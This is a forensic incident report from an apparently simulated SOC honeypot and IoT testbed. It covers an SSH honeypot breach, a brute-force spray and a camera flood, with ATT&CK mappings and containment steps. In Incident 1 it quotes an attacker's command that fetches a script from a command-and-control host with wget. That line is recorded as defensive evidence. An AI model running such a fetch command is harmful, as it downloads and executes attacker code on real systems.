# Forensic Threat Investigation Report

**Report Identifier:** `REP-20261108-001`  
**Investigation Lead:** Senior SOC Incident Responder  
**Platform:** Mini SOC and Threat Detection Platform  
**Target Environment:** Local Apple Silicon (ARM64) Hybrid Honeynet & IoT Subnet  
**Classification:** TLP:AMBER (Internal Security Operations Review)  

---

## 1. Executive Summary

During the monitoring window on **2026-11-08**, the Mini SOC Platform monitored 3 honeypots (Cowrie SSH/Telnet, Dionaea Malware Trap, Mosquitto MQTT Honey) and 10 simulated IoT edge devices. The platform recorded **38 security events**, generated **6 security alerts**, and correlated **3 major security incidents**.

All incidents were enriched with threat intelligence, assigned explainable multi-factor risk scores, and contained via the SOAR automation engine under safe simulation mode.

---

## 2. Threat Incidents Discovered

### Incident 1: `INC-F8BCDE0F` – Active Honeypot Breach & Payload Drop
- **Severity / Risk Score:** **CRITICAL** (Risk Score: **73.0 / 100**)
- **Attacking Source IP:** `203.0.113.99`
- **Targeted Asset:** Cowrie SSH Honeypot (Port 2222)
- **TTP Sequence:**
  1. Actor authenticated successfully against decoy account `root`.
  2. Spawned interactive shell session and executed `wget http://c2-beacon.ru/agent.sh`.
  3. Downloaded binary artifact with SHA-256: `4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a`.
- **MITRE ATT&CK Mapping:**
  - `T1078` – Valid Accounts
  - `T1059.004` – Unix Shell
  - `T1105` – Ingress Tool Transfer
- **SOAR Response Action:**
  - Automated simulated containment rule applied (`iptables -A DOCKER-USER -s 203.0.113.99 -j DROP`).
  - Alert notification dispatched to analyst Telegram channel.
  - Incident status updated to `CONTAINED`.

---

### Incident 2: `INC-78F8EFC2` – Distributed SSH Brute-Force Spray
- **Severity / Risk Score:** **HIGH** (Risk Score: **36.2 / 100**)
- **Attacking Source IP:** `198.51.100.44`
- **Targeted Asset:** Cowrie SSH / Telnet (Port 2222/2223)
- **Observed Behavior:** Rapid automated credential guessing targeting accounts: `root`, `admin`, `service`, `operator`.
- **MITRE ATT&CK Mapping:**
  - `T1110` – Brute Force
  - `T1110.001` – Password Guessing
- **Threat Intelligence:**
  - AbuseIPDB abuse confidence score: 78% (Hosting / VPS range).
- **Remediation Recommendation:**
  - Apply permanent border firewall drop for `198.51.100.44`.

---

### Incident 3: `INC-47BB4E39` – IoT Device Compromise & DDoS Publish Flood
- **Severity / Risk Score:** **HIGH** (Risk Score: **70.7 / 100**)
- **Affected Asset:** `iot-cam-01` (Lobby Panoramic IP Camera, Simulated IP: `192.168.1.101`)
- **Observed Behavior:**
  - Device telemetry spiked from 1 msg / 5s to 15 burst messages within 200 milliseconds.
  - Camera FPS inflated to 120 and bitrate exceeded 95,000 kbps, exhibiting characteristics of Mirai botnet DDoS flooding.
- **MITRE ATT&CK Mapping:**
  - `T1499` – Endpoint Denial of Service
- **Remediation Recommendation:**
  - Isolate camera VLAN segment.
  - Re-flash firmware `v3.4.1` and rotate device credentials.

---

## 3. Machine Learning Anomaly Detection Analysis

The Isolation Forest anomaly detector evaluated telemetry feature vectors during the attack window:
- **Baseline Telemetry Path Length:** High ($> 12.0$), indicating standard behavior (Anomaly Score: $\sim 0.35$).
- **Attack Burst Path Length:** Abnormally short ($< 4.0$), indicating rapid isolation of the high-rate publish burst (Anomaly Score: $\mathbf{0.82}$).
- **Detection Decision:** Successfully flagged the camera flood as an anomaly with 100% confidence.

---

## 4. Evidence Integrity Attestation

In accordance with forensic chain of custody standards:
- All incident notes and status changes were recorded in an append-only, SHA-256 hash-chained audit log (`reports/audit_trail.json`).
- Chain verification passed with status: **`VALID (UNBROKEN)`**.
- Primary log files were hashed and attested in `reports/evidence_integrity_manifest.json`.

